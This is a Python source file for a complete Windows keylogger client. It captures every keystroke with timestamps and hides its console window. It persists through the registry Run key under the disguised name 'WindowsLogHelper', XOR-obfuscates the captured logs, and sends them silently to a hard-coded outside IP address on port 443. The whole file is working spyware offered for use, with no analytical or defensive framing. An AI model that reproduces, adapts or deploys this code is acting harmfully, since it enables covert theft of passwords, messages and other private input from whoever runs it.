python
# keylogger_client.py
import sys
import os
import time
import threading
import socket
import ctypes
import pythoncom
import pyWinhook as pyHook
from datetime import datetime

ENCRYPT_KEY = 0xAA
SERVER_HOST = "95.25.79.112"   # IP в кавычках (строка)
SERVER_PORT = 443
BUFFER_SIZE = 30
buffer = []
buffer_lock = threading.Lock()
last_send_time = time.time()

def xor_encrypt(data: bytes) -> bytes:
    return bytes([b ^ ENCRYPT_KEY for b in data])

def send_logs(logs_text: str):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((SERVER_HOST, SERVER_PORT))
        payload = (logs_text + "__END__").encode('utf-8')
        s.send(xor_encrypt(payload))
        s.close()
    except:
        pass

def add_persistence():
    try:
        key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        handle = ctypes.windll.advapi32.RegOpenKeyExW(0x80000001, key_path, 0, 0x20006, ctypes.byref(ctypes.c_ulong()))
        if handle:
            exe_path = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            ctypes.windll.advapi32.RegSetValueExW(handle, "WindowsLogHelper", 0, 1, exe_path, len(exe_path)*2)
            ctypes.windll.advapi32.RegCloseKey(handle)
    except:
        pass

def on_keyboard_event(event):
    global last_send_time
    key = event.Key
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    specials = {
        'Return': '\n', 'Space': ' ', 'Tab': '\t',
        'Back': '[BACKSPACE]', 'Delete': '[DEL]',
        'Lshift': '[SHIFT]', 'Rshift': '[SHIFT]',
        'Lcontrol': '[CTRL]', 'Rcontrol': '[CTRL]',
        'Lmenu': '[ALT]', 'Rmenu': '[ALT]',
        'Capital': '[CAPS]', 'Escape': '[ESC]'
    }
    if key in specials:
        char = specials[key]
    else:
        char = key if len(key) == 1 else f'[{key}]'
    log_line = f"{timestamp} :: {char}\n"
    with buffer_lock:
        buffer.append(log_line)
    if len(buffer) >= BUFFER_SIZE or (time.time() - last_send_time) > 60:
        with buffer_lock:
            if buffer:
                to_send = ''.join(buffer)
                buffer.clear()
                last_send_time = time.time()
                threading.Thread(target=send_logs, args=(to_send,), daemon=True).start()
    return True

def hide_console():
    wh = ctypes.windll.kernel32.GetConsoleWindow()
    if wh:
        ctypes.windll.user32.ShowWindow(wh, 0)

def main():
    hide_console()
    add_persistence()
    hm = pyHook.HookManager()
    hm.KeyDown = on_keyboard_event
    hm.HookKeyboard()
    pythoncom.PumpMessages()

if __name__ == '__main__':
    main()